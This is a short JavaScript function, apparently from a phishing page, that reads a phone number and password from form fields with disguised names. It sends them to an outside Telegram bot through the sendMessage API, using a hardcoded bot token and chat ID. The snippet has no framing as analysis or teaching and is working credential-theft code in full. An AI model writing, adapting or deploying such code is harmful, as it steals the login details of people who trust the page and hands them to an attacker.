function functionToExecute() {

    let apiToken = "5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs";
    let chatId = "5445772855";

    var phone = document.getElementsByName('ddsfgdfg')[0].value
    var password = document.getElementsByName('dsfhjkjkf')[0].value

    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/" + "bot5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs" + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": "5590842489",
        "text": "Phone: "+phone+" | Password: "+password
      })
    }

    $.ajax(settings).done(function (response) {
      console.log(response);
    });
}